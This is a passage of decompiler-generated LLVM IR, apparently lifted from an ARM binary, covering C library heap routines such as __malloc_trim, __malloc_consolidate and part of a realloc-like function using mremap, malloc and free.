  %v2_15a7c = inttoptr i32 %v1_15a7c to i32*
  %v3_15a7c = load i32, i32* %v2_15a7c, align 4
  %tmp41 = icmp ugt i32 %v2_15a74, 15
  %v1_15aa4 = urem i32 %v3_15a7c, 2
  store i32 %v1_15aa4, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_15aa4, label %dec_label_pc_15a84

dec_label_pc_15a84:                               ; preds = %dec_label_pc_15a74
  %v2_15a88 = or i32 %v1_15aa4, %v0_15a88
  store i32 %v2_15a88, i32* %r3.global-to-local, align 4
  store i32 %v2_15a88, i32* %v2_15a7c, align 4
  %v0_15a90 = load i32, i32* @sl, align 4
  %v1_15a90 = load i32, i32* %r0.global-to-local, align 4
  %v2_15a90 = add i32 %v1_15a90, %v0_15a90
  store i32 %v2_15a90, i32* %r2.global-to-local, align 4
  %v1_15a94 = add i32 %v2_15a90, 4
  %v2_15a94 = inttoptr i32 %v1_15a94 to i32*
  %v3_15a94 = load i32, i32* %v2_15a94, align 4
  %v1_15a98 = or i32 %v3_15a94, 1
  store i32 %v1_15a98, i32* %r3.global-to-local, align 4
  store i32 %v1_15a98, i32* %v2_15a94, align 4
  br label %dec_label_pc_15ad4

dec_label_pc_15aa4:                               ; preds = %dec_label_pc_15a74
  %v2_15aa8 = add i32 %v0_15a7c, %v0_15a74
  store i32 %v2_15aa8, i32* %r0.global-to-local, align 4
  %v2_15aac = or i32 %v1_15aa4, %v0_15a74
  store i32 %v2_15aac, i32* %r3.global-to-local, align 4
  %v1_15ab0 = or i32 %v2_15a74, 1
  store i32 %v1_15ab0, i32* %r2.global-to-local, align 4
  store i32 %v2_15aac, i32* %v2_15a7c, align 4
  %v0_15ab8 = load i32, i32* %r2.global-to-local, align 4
  %v1_15ab8 = load i32, i32* %r0.global-to-local, align 4
  %v2_15ab8 = add i32 %v1_15ab8, 4
  %v3_15ab8 = inttoptr i32 %v2_15ab8 to i32*
  store i32 %v0_15ab8, i32* %v3_15ab8, align 4
  %v0_15abc = load i32, i32* %r0.global-to-local, align 4
  %v1_15abc = load i32, i32* %r1.global-to-local, align 4
  %v2_15abc = add i32 %v1_15abc, %v0_15abc
  store i32 %v2_15abc, i32* %r2.global-to-local, align 4
  %v1_15ac0 = add i32 %v2_15abc, 4
  %v2_15ac0 = inttoptr i32 %v1_15ac0 to i32*
  %v3_15ac0 = load i32, i32* %v2_15ac0, align 4
  %v1_15ac4 = or i32 %v3_15ac0, 1
  store i32 %v1_15ac4, i32* %r3.global-to-local, align 4
  store i32 %v1_15ac4, i32* %v2_15ac0, align 4
  %v0_15acc = load i32, i32* %r0.global-to-local, align 4
  %v1_15acc = add i32 %v0_15acc, 8
  store i32 %v1_15acc, i32* @r0, align 4
  %v0_15ad0 = call i32 @free()
  store i32 %v0_15ad0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15ad4

dec_label_pc_15ad4:                               ; preds = %dec_label_pc_15a84, %dec_label_pc_15aa4
  %v0_15ad4 = load i32, i32* @sl, align 4
  %v1_15ad4 = add i32 %v0_15ad4, 8
  store i32 %v1_15ad4, i32* @r4, align 4
  br label %dec_label_pc_15ba8

dec_label_pc_15adc:                               ; preds = %bb29
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %r1.global-to-local, align 4
  %v4_15ae4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 36) to i32*), align 4
  store i32 %v4_15ae4, i32* @r8, align 4
  %v2_15ae8 = inttoptr i32 %v1_158f8 to i32*
  %v3_15ae8 = load i32, i32* %v2_15ae8, align 4
  store i32 %v3_15ae8, i32* @r4, align 4
  %v1_15aec = add i32 %v4_15ae4, 860
  %v2_15aec = inttoptr i32 %v1_15aec to i32*
  %v3_15aec = load i32, i32* %v2_15aec, align 4
  %v1_15af0 = add i32 %v3_15ae8, 4
  %v1_15af4 = add i32 %v3_15aec, -1
  store i32 %v1_15af4, i32* %r2.global-to-local, align 4
  %v2_15af8 = add i32 %v1_15af0, %v1_15af4
  %v1_15afc = load i32, i32* @sb, align 4
  %v2_15afc = add i32 %v2_15af8, %v1_15afc
  store i32 %v2_15afc, i32* %r3.global-to-local, align 4
  %v2_15b00 = sub i32 0, %v3_15aec
  %v3_15b00 = and i32 %v2_15afc, %v2_15b00
  store i32 %v3_15b00, i32* @r7, align 4
  %v2_15b04 = sub i32 %v3_15b00, %v3_15ae8
  store i32 %v2_15b04, i32* @fp, align 4
  %v9_15b08 = icmp eq i32 %v1_158fc, %v2_15b04
  br i1 %v9_15b08, label %dec_label_pc_15b7c, label %dec_label_pc_15b10

dec_label_pc_15b10:                               ; preds = %dec_label_pc_15adc
  %v2_15b10 = sub i32 %v1_158f8, %v3_15ae8
  store i32 %v2_15b10, i32* %r0.global-to-local, align 4
  %v2_15b14 = add i32 %v3_15ae8, %v1_158fc
  store i32 %v2_15b14, i32* %r1.global-to-local, align 4
  store i32 %v3_15b00, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_15b20 = call i32 @mremap(i32 %v2_15b10, i32 %v2_15b14, i32 %v3_15b00, i32 1)
  store i32 %v4_15b20, i32* %r0.global-to-local, align 4
  %v7_15b24 = icmp eq i32 %v4_15b20, -1
  br i1 %v7_15b24, label %dec_label_pc_15b70, label %dec_label_pc_15b2c

dec_label_pc_15b2c:                               ; preds = %dec_label_pc_15b10
  %v1_15b2c = load i32, i32* @r4, align 4
  %v2_15b2c = add i32 %v1_15b2c, %v4_15b20
  store i32 %v2_15b2c, i32* %r0.global-to-local, align 4
  %v0_15b30 = load i32, i32* @fp, align 4
  %v1_15b30 = or i32 %v0_15b30, 2
  store i32 %v1_15b30, i32* %r3.global-to-local, align 4
  %v2_15b34 = add i32 %v2_15b2c, 4
  %v3_15b34 = inttoptr i32 %v2_15b34 to i32*
  store i32 %v1_15b30, i32* %v3_15b34, align 4
  %v0_15b38 = load i32, i32* @r8, align 4
  %v1_15b38 = add i32 %v0_15b38, 868
  %v2_15b38 = inttoptr i32 %v1_15b38 to i32*
  %v3_15b38 = load i32, i32* %v2_15b38, align 4
  store i32 %v3_15b38, i32* %r3.global-to-local, align 4
  %v1_15b3c = add i32 %v0_15b38, 880
  %v2_15b3c = inttoptr i32 %v1_15b3c to i32*
  %v3_15b3c = load i32, i32* %v2_15b3c, align 4
  store i32 %v3_15b3c, i32* %r2.global-to-local, align 4
  %v0_15b40 = load i32, i32* @r6, align 4
  %v2_15b40 = sub i32 %v3_15b38, %v0_15b40
  store i32 %v2_15b40, i32* %r3.global-to-local, align 4
  %v1_15b44 = load i32, i32* @r7, align 4
  %v2_15b44 = add i32 %v1_15b44, %v2_15b40
  store i32 %v2_15b44, i32* %r1.global-to-local, align 4
  %v1_15b48 = add i32 %v0_15b38, 872
  %v2_15b48 = inttoptr i32 %v1_15b48 to i32*
  %v3_15b48 = load i32, i32* %v2_15b48, align 4
  store i32 %v3_15b48, i32* %r3.global-to-local, align 4
  %v1_15b50 = add i32 %v0_15b38, 884
  %v2_15b50 = inttoptr i32 %v1_15b50 to i32*
  %v3_15b50 = load i32, i32* %v2_15b50, align 4
  store i32 %v3_15b50, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_15b44, %v3_15b3c
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_15b2c
  store i32 %v2_15b44, i32* %v2_15b3c, align 4
  %v0_15b58.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_15b58.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_15b2c, %bb33
  %v1_15b58 = phi i32 [ %v0_15b38, %dec_label_pc_15b2c ], [ %v1_15b58.pre, %bb33 ]
  %v0_15b58 = phi i32 [ %v2_15b44, %dec_label_pc_15b2c ], [ %v0_15b58.pre, %bb33 ]
  %v2_15b58 = add i32 %v1_15b58, 868
  %v3_15b58 = inttoptr i32 %v2_15b58 to i32*
  store i32 %v0_15b58, i32* %v3_15b58, align 4
  %v0_15b5c = load i32, i32* %r1.global-to-local, align 4
  %v1_15b5c = load i32, i32* %r3.global-to-local, align 4
  %v2_15b5c = add i32 %v1_15b5c, %v0_15b5c
  store i32 %v2_15b5c, i32* %r1.global-to-local, align 4
  %v1_15b60 = load i32, i32* %r2.global-to-local, align 4
  %v0_15b64 = load i32, i32* %r0.global-to-local, align 4
  %v1_15b64 = add i32 %v0_15b64, 8
  store i32 %v1_15b64, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_15b5c, %v1_15b60
  br i1 %tmp43, label %bb35, label %dec_label_pc_15ba8

bb35:                                             ; preds = %bb34
  %v5_15b68 = load i32, i32* @r8, align 4
  %v6_15b68 = add i32 %v5_15b68, 884
  %v7_15b68 = inttoptr i32 %v6_15b68 to i32*
  store i32 %v2_15b5c, i32* %v7_15b68, align 4
  br label %dec_label_pc_15ba8

dec_label_pc_15b70:                               ; preds = %dec_label_pc_15b10
  %v0_15b70 = load i32, i32* @sb, align 4
  %v1_15b70 = add i32 %v0_15b70, 4
  store i32 %v1_15b70, i32* %r3.global-to-local, align 4
  %v0_15b74 = load i32, i32* @r6, align 4
  %v3_15b74 = icmp ult i32 %v0_15b74, %v1_15b70
  br i1 %v3_15b74, label %dec_label_pc_15b84, label %dec_label_pc_15b70.dec_label_pc_15b7c_crit_edge

dec_label_pc_15b70.dec_label_pc_15b7c_crit_edge:  ; preds = %dec_label_pc_15b70
  %v0_15b7c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15b7c

dec_label_pc_15b7c:                               ; preds = %dec_label_pc_15b70.dec_label_pc_15b7c_crit_edge, %dec_label_pc_15adc
  %v0_15b7c = phi i32 [ %v0_15b7c.pre, %dec_label_pc_15b70.dec_label_pc_15b7c_crit_edge ], [ %v0_158e4, %dec_label_pc_15adc ]
  store i32 %v0_15b7c, i32* @r4, align 4
  br label %dec_label_pc_15ba8

dec_label_pc_15b84:                               ; preds = %dec_label_pc_15b70
  %v1_15b84 = add i32 %v0_15b70, -7
  store i32 %v1_15b84, i32* %r0.global-to-local, align 4
  %v1_15b88 = call i32 @malloc(i32 %v1_15b84)
  store i32 %v1_15b88, i32* @r0, align 4
  store i32 %v1_15b88, i32* @r4, align 4
  %v2_15b8c = icmp eq i32 %v1_15b88, 0
  br i1 %v2_15b8c, label %dec_label_pc_15ba8, label %dec_label_pc_15b94

dec_label_pc_15b94:                               ; preds = %dec_label_pc_15b84
  %v0_15b94 = load i32, i32* @r6, align 4
  %v1_15b94 = add i32 %v0_15b94, -8
  store i32 %v1_15b94, i32* @r2, align 4
  %v0_15b98 = load i32, i32* @r5, align 4
  store i32 %v0_15b98, i32* @r1, align 4
  %v0_15b9c = call i32 @memcpy()
  %v0_15ba0 = load i32, i32* @r5, align 4
  store i32 %v0_15ba0, i32* @r0, align 4
  %v0_15ba4 = call i32 @free()
  store i32 %v0_15ba4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15ba8

dec_label_pc_15ba8:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_15b84, %dec_label_pc_15b7c, %dec_label_pc_15ad4, %.thread6, %dec_label_pc_15944, %dec_label_pc_15b94
  store i32 %v2_15898, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 28, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %r2.global-to-local, align 4
  %v4_15bb8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 28) to i32*), align 4
  store i32 %v4_15bb8, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_15bb8)
  br label %dec_label_pc_15bc4

dec_label_pc_15bc4:                               ; preds = %dec_label_pc_158cc, %dec_label_pc_15874, %dec_label_pc_1585c, %dec_label_pc_15ba8
  %v0_15bc4 = load i32, i32* @r4, align 4
  store i32 %v0_15bc4, i32* %r0.global-to-local, align 4
  store i32 %v3_1583c, i32* @r4, align 4
  store i32 %v6_1583c, i32* @r5, align 4
  store i32 %v9_1583c, i32* @r6, align 4
  store i32 %v12_1583c, i32* @r7, align 4
  store i32 %v15_1583c, i32* @r8, align 4
  store i32 %v18_1583c, i32* @sb, align 4
  store i32 %v21_1583c, i32* @sl, align 4
  store i32 %v24_1583c, i32* @fp, align 4
  store i32 %v27_1583c, i32* @lr, align 4
  ret i32 %v0_15bc4

; uselistorder directives
  uselistorder i32 %v2_15b5c, { 1, 0, 2 }
  uselistorder i32 %v2_15b44, { 1, 2, 0, 3 }
  uselistorder i32 %v4_15b20, { 1, 0, 2 }
  uselistorder i32 %v3_15b00, { 1, 0, 2, 3 }
  uselistorder i32 %v1_15aa4, { 2, 1, 0 }
  uselistorder i32 %v2_15a74, { 1, 0, 2 }
  uselistorder i32 %v0_15a08, { 1, 0 }
  uselistorder i32 %v1_159c4, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_15928, { 0, 2, 1, 3 }
  uselistorder i32 %v2_15920, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_15904, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_158fc, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_158f8, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_158e8, { 1, 0 }
  uselistorder i32 %v0_158e4, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_158c4, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 12, 8, 9, 10, 11, 23, 13, 15, 14, 16, 22, 24, 17, 18, 19, 20, 21, 27, 26, 25, 28, 30, 29 }
  uselistorder i32 %arg2, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_15bc4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_15ba8, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_15ad4, { 1, 0 }
  uselistorder label %dec_label_pc_15a74, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_159c0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_159b4, { 1, 0 }
  uselistorder label %dec_label_pc_159b0, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_15bd8(i32 %arg1) local_unnamed_addr {
dec_label_pc_15bd8:
  %v0_15bd8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15bd8, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_15bd8
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_15bd8, %bb
  %v10_15bec = phi i32 [ %arg1, %dec_label_pc_15bd8 ], [ 0, %bb ]
  ret i32 %v10_15bec

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v1_15bf0 = add i32 %arg2, 44
  %v2_15bf0 = inttoptr i32 %v1_15bf0 to i32*
  %v3_15bf0 = load i32, i32* %v2_15bf0, align 4
  %v3_15bf4 = load i32, i32* @r4, align 4
  store i32 %v3_15bf4, i32* %stack_var_-20, align 4
  %v12_15bf4 = load i32, i32* @r7, align 4
  %v1_15bf8 = add i32 %v3_15bf0, 4
  %v2_15bf8 = inttoptr i32 %v1_15bf8 to i32*
  %v3_15bf8 = load i32, i32* %v2_15bf8, align 4
  %v1_15bfc = add i32 %arg2, 860
  %v2_15bfc = inttoptr i32 %v1_15bfc to i32*
  %v3_15bfc = load i32, i32* %v2_15bfc, align 4
  store i32 %v3_15bfc, i32* @r4, align 4
  %v1_15c00 = and i32 %v3_15bf8, -4
  store i32 %v1_15c00, i32* @r6, align 4
  %v1_15c04 = add i32 %v1_15c00, -17
  %v2_15c08 = add i32 %v1_15c04, %v3_15bfc
  store i32 %arg2, i32* @r5, align 4
  %v2_15c14 = sub i32 %v2_15c08, %arg1
  store i32 %v3_15bfc, i32* %r1.global-to-local, align 4
  %v2_15c1c = udiv i32 %v2_15c14, %v3_15bfc
  %v1_15c20 = add i32 %v2_15c1c, -1
  store i32 %v1_15c20, i32* %r0.global-to-local, align 4
  %v2_15c24 = mul i32 %v1_15c20, %v3_15bfc
  store i32 %v2_15c24, i32* @r7, align 4
  %v2_15c28 = icmp eq i32 %v2_15c24, 0
  store i1 %v2_15c28, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_15c24, 1
  br i1 %tmp8, label %dec_label_pc_15c90, label %dec_label_pc_15c30

dec_label_pc_15c30:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_15c34 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_15c34, i32* %r0.global-to-local, align 4
  %v0_15c38 = load i32, i32* @r5, align 4
  %v1_15c38 = add i32 %v0_15c38, 44
  %v2_15c38 = inttoptr i32 %v1_15c38 to i32*
  %v3_15c38 = load i32, i32* %v2_15c38, align 4
  %v0_15c3c = load i32, i32* @r6, align 4
  %v2_15c3c = add i32 %v0_15c3c, %v3_15c38
  %v9_15c40 = icmp eq i32 %v1_15c34, %v2_15c3c
  store i1 %v9_15c40, i1* @cpsr_z, align 1
  store i32 %v1_15c34, i32* @r4, align 4
  br i1 %v9_15c40, label %dec_label_pc_15c4c, label %dec_label_pc_15c90

dec_label_pc_15c4c:                               ; preds = %dec_label_pc_15c30
  %v0_15c4c = load i32, i32* @r7, align 4
  %v1_15c4c = sub i32 0, %v0_15c4c
  store i32 %v1_15c4c, i32* %r0.global-to-local, align 4
  %v1_15c50 = call i32 @__GI_sbrk(i32 %v1_15c4c)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_15c58 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_15c58, i32* %r0.global-to-local, align 4
  %v7_15c5c = icmp eq i32 %v1_15c58, -1
  store i1 %v7_15c5c, i1* @cpsr_z, align 1
  br i1 %v7_15c5c, label %dec_label_pc_15c90, label %dec_label_pc_15c64

dec_label_pc_15c64:                               ; preds = %dec_label_pc_15c4c
  %v0_15c64 = load i32, i32* @r4, align 4
  %v2_15c64 = sub i32 %v0_15c64, %v1_15c58
  store i32 %v2_15c64, i32* %r0.global-to-local, align 4
  %v9_15c64 = icmp eq i32 %v0_15c64, %v1_15c58
  store i1 %v9_15c64, i1* @cpsr_z, align 1
  br i1 %v9_15c64, label %dec_label_pc_15c90, label %dec_label_pc_15c6c

dec_label_pc_15c6c:                               ; preds = %dec_label_pc_15c64
  %v0_15c6c = load i32, i32* @r5, align 4
  %v1_15c6c = add i32 %v0_15c6c, 872
  %v2_15c6c = inttoptr i32 %v1_15c6c to i32*
  %v3_15c6c = load i32, i32* %v2_15c6c, align 4
  %v1_15c70 = load i32, i32* @r6, align 4
  %v2_15c70 = sub i32 %v1_15c70, %v2_15c64
  store i32 %v2_15c70, i32* %r2.global-to-local, align 4
  %v1_15c74 = add i32 %v0_15c6c, 44
  %v2_15c74 = inttoptr i32 %v1_15c74 to i32*
  %v3_15c74 = load i32, i32* %v2_15c74, align 4
  store i32 %v3_15c74, i32* %r1.global-to-local, align 4
  %v2_15c78 = sub i32 %v3_15c6c, %v2_15c64
  %v1_15c7c = or i32 %v2_15c70, 1
  store i32 %v1_15c7c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_15c78, i32* %v2_15c6c, align 4
  %v0_15c88 = load i32, i32* %r2.global-to-local, align 4
  %v1_15c88 = load i32, i32* %r1.global-to-local, align 4
  %v2_15c88 = add i32 %v1_15c88, 4
  %v3_15c88 = inttoptr i32 %v2_15c88 to i32*
  store i32 %v0_15c88, i32* %v3_15c88, align 4
  %v1_15c9c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15c94

dec_label_pc_15c90:                               ; preds = %dec_label_pc_15c30, %dec_label_pc_15c64, %dec_label_pc_15c4c, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15c94

dec_label_pc_15c94:                               ; preds = %dec_label_pc_15c6c, %dec_label_pc_15c90
  %v1_15c9c = phi i32 [ %v1_15c9c.pre, %dec_label_pc_15c6c ], [ 0, %dec_label_pc_15c90 ]
  %v2_15c98 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_15c98, i32* @r4, align 4
  store i32 %v12_15bf4, i32* @r7, align 4
  ret i32 %v1_15c9c

; uselistorder directives
  uselistorder i1 %v7_15c5c, { 1, 0 }
  uselistorder i32 %v1_15c58, { 2, 1, 0, 3 }
  uselistorder i32 %v3_15bfc, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 872, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 (i32)* @__GI_sbrk, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_15c94, { 1, 0 }
  uselistorder label %dec_label_pc_15c90, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_15ca0 = load i32, i32* @r4, align 4
  store i32 %v3_15ca0, i32* %stack_var_-36, align 4
  %v0_15ca4 = load i32, i32* @r0, align 4
  %v1_15ca4 = inttoptr i32 %v0_15ca4 to i32*
  %v2_15ca4 = load i32, i32* %v1_15ca4, align 4
  store i32 %v2_15ca4, i32* %r3.global-to-local, align 4
  %v2_15ca8 = icmp eq i32 %v2_15ca4, 0
  store i32 %v0_15ca4, i32* @r4, align 4
  br i1 %v2_15ca8, label %dec_label_pc_15de0.preheader, label %dec_label_pc_15cbc

dec_label_pc_15de0.preheader:                     ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_15de825 = add i32 %v0_15ca4, 52
  store i32 %v1_15de825, i32* %r3.global-to-local, align 4
  %v2_15df026 = add i32 %v0_15ca4, 60
  %v3_15df027 = inttoptr i32 %v2_15df026 to i32*
  store i32 %v1_15de825, i32* %v3_15df027, align 4
  %v0_15df428 = load i32, i32* %r3.global-to-local, align 4
  %v2_15df429 = add i32 %v0_15df428, 12
  %v3_15df430 = inttoptr i32 %v2_15df429 to i32*
  store i32 %v0_15df428, i32* %v3_15df430, align 4
  br label %dec_label_pc_15de0.dec_label_pc_15de0_crit_edge

dec_label_pc_15cbc:                               ; preds = %entry
  %v1_15cbc = and i32 %v2_15ca4, -3
  %v3_15cc0 = udiv i32 %v2_15ca4, 8
  store i32 %v3_15cc0, i32* %r2.global-to-local, align 4
  store i32 %v1_15cbc, i32* %v1_15ca4, align 4
  %v0_15cc8 = load i32, i32* @r0, align 4
  %v1_15cc8 = add i32 %v0_15cc8, -4
  store i32 %v1_15cc8, i32* %r3.global-to-local, align 4
  %v1_15ccc = load i32, i32* %r2.global-to-local, align 4
  %v4_15ccc = mul i32 %v1_15ccc, 4
  %v5_15ccc = add i32 %v4_15ccc, %v1_15cc8
  store i32 %v5_15ccc, i32* %sb.global-to-local, align 4
  %v1_15cd0 = add i32 %v0_15cc8, 52
  store i32 %v1_15cd0, i32* %r7.global-to-local, align 4
  %v1_15cd4 = add i32 %v0_15cc8, 4
  store i32 %v1_15cd4, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_15cdc

dec_label_pc_15cdc:                               ; preds = %dec_label_pc_15dd8, %dec_label_pc_15cbc
  %v1_15dd010 = phi i32 [ %v1_15dd0, %dec_label_pc_15dd8 ], [ %v5_15ccc, %dec_label_pc_15cbc ]
  %v1_15ce8 = phi i32 [ %v1_15dd8, %dec_label_pc_15dd8 ], [ %v1_15cd4, %dec_label_pc_15cbc ]
  %v1_15cdc = inttoptr i32 %v1_15ce8 to i32*
  %v2_15cdc = load i32, i32* %v1_15cdc, align 4
  store i32 %v2_15cdc, i32* %r1.global-to-local, align 4
  %v2_15ce0 = icmp eq i32 %v2_15cdc, 0
  br i1 %v2_15ce0, label %dec_label_pc_15dd0, label %dec_label_pc_15ce8

dec_label_pc_15ce8:                               ; preds = %dec_label_pc_15cdc
  %v0_15ce8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_15ce8, i32* %v1_15cdc, align 4
  %v0_15cec.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15cec

dec_label_pc_15cec:                               ; preds = %dec_label_pc_15dc4, %dec_label_pc_15ce8
  %v0_15d08 = phi i32 [ %v0_15dc4, %dec_label_pc_15dc4 ], [ %v0_15cec.pre, %dec_label_pc_15ce8 ]
  %v1_15cec = add i32 %v0_15d08, 4
  %v2_15cec = inttoptr i32 %v1_15cec to i32*
  %v3_15cec = load i32, i32* %v2_15cec, align 4
  store i32 %v3_15cec, i32* %r3.global-to-local, align 4
  %v1_15cf0 = and i32 %v3_15cec, -2
  store i32 %v1_15cf0, i32* %lr.global-to-local, align 4
  %v2_15cf4 = add i32 %v1_15cf0, %v0_15d08
  store i32 %v2_15cf4, i32* @r0, align 4
  %v1_15cf8 = urem i32 %v3_15cec, 2
  %v2_15cf8 = icmp eq i32 %v1_15cf8, 0
  %v1_15cfc = add i32 %v0_15d08, 8
  %v2_15cfc = inttoptr i32 %v1_15cfc to i32*
  %v3_15cfc = load i32, i32* %v2_15cfc, align 4
  store i32 %v3_15cfc, i32* %sl.global-to-local, align 4
  %v1_15d00 = add i32 %v2_15cf4, 4
  %v2_15d00 = inttoptr i32 %v1_15d00 to i32*
  %v3_15d00 = load i32, i32* %v2_15d00, align 4
  store i32 %v3_15d00, i32* %r8.global-to-local, align 4
  br i1 %v2_15cf8, label %dec_label_pc_15d08, label %dec_label_pc_15d3c

dec_label_pc_15d08:                               ; preds = %dec_label_pc_15cec
  %v1_15d08 = inttoptr i32 %v0_15d08 to i32*
  %v2_15d08 = load i32, i32* %v1_15d08, align 4
  store i32 %v2_15d08, i32* %r5.global-to-local, align 4
  %v2_15d0c = sub i32 %v0_15d08, %v2_15d08
  store i32 %v2_15d0c, i32* %r3.global-to-local, align 4
  %v1_15d10 = add i32 %v2_15d0c, 8
  %v2_15d10 = inttoptr i32 %v1_15d10 to i32*
  %v3_15d10 = load i32, i32* %v2_15d10, align 4
  store i32 %v3_15d10, i32* @ip, align 4
  %v1_15d14 = add i32 %v3_15d10, 12
  %v2_15d14 = inttoptr i32 %v1_15d14 to i32*
  %v3_15d14 = load i32, i32* %v2_15d14, align 4
  store i32 %v3_15d14, i32* %r1.global-to-local, align 4
  %v9_15d18 = icmp eq i32 %v3_15d14, %v2_15d0c
  %v1_15d1c = add i32 %v2_15d0c, 12
  %v2_15d1c = inttoptr i32 %v1_15d1c to i32*
  %v3_15d1c = load i32, i32* %v2_15d1c, align 4
  store i32 %v3_15d1c, i32* %r2.global-to-local, align 4
  br i1 %v9_15d18, label %dec_label_pc_15d24, label %dec_label_pc_15d80

dec_label_pc_15d24:                               ; preds = %dec_label_pc_15d08
  %v1_15d24 = add i32 %v3_15d1c, 8
  %v2_15d24 = inttoptr i32 %v1_15d24 to i32*
  %v3_15d24 = load i32, i32* %v2_15d24, align 4
  store i32 %v3_15d24, i32* %r3.global-to-local, align 4
  %v9_15d28 = icmp eq i32 %v3_15d24, %v2_15d0c
  br i1 %v9_15d28, label %dec_label_pc_15d30, label %dec_label_pc_15d80

dec_label_pc_15d30:                               ; preds = %dec_label_pc_15d24
  store i32 %v3_15d10, i32* %v2_15d24, align 4
  %v0_15d34 = load i32, i32* %r2.global-to-local, align 4
  %v1_15d34 = load i32, i32* @ip, align 4
  %v2_15d34 = add i32 %v1_15d34, 12
  %v3_15d34 = inttoptr i32 %v2_15d34 to i32*
  store i32 %v0_15d34, i32* %v3_15d34, align 4
  %v0_15d38 = load i32, i32* %lr.global-to-local, align 4
  %v1_15d38 = load i32, i32* %r5.global-to-local, align 4
  %v2_15d38 = add i32 %v1_15d38, %v0_15d38
  store i32 %v2_15d38, i32* %lr.global-to-local, align 4
  %v0_15d40.pre = load i32, i32* @r0, align 4
  %v0_15d44.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_15d3c

